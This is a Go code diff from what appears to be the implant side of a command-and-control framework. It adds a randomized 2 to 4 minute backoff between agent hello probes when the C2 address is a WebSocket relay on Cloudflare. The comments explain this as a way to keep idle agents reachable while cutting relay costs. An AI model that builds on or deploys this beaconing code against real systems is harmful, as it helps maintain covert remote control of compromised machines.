@@ -327,8 +327,40 @@ func MsgTunneler(conn io.ReadWriteCloser, config *def.Config, callback func(*def
 			break
 		}
 		handshakeDone = true
+		if relayHelloBackoff(ctx) {
+			continue
+		}
 		util.TakeASnap()
 	}
 
 	return fmt.Errorf("MsgTunneler closed: %v", ctx.Err())
+}
+
+// relayHelloBackoff sleeps between hello probes on relay transports.
+//
+// On worker_ws the command path is push-based: the CC writes commands
+// through the live WebSocket at any time, so the hello here is only an
+// app-level liveness probe. Each hello wakes the relay's Durable Object
+// (billed as a DO request on Cloudflare's free plan) twice — probe plus
+// reply — so idle agents must not keep the http_poll cadence (5-60s,
+// designed for pull-based command fetching). We back off to 2-4min,
+// still well under the CC's 10min tunnel handshake timeout, while the
+// WS protocol-level ping (30s, answered by the edge for free) keeps the
+// connection itself alive.
+//
+// Returns true when the sleep completed on a relay transport.
+func relayHelloBackoff(ctx context.Context) bool {
+	addr := def.CCAddress
+	if !strings.HasPrefix(addr, "wss://") && !strings.HasPrefix(addr, "ws://") {
+		return false
+	}
+	if !strings.Contains(addr, "/ws/") {
+		return false
+	}
+	interval := time.Duration(util.RandInt(120, 240)) * time.Second
+	select {
+	case <-ctx.Done():
+	case <-time.After(interval):
+	}
+	return true
 }
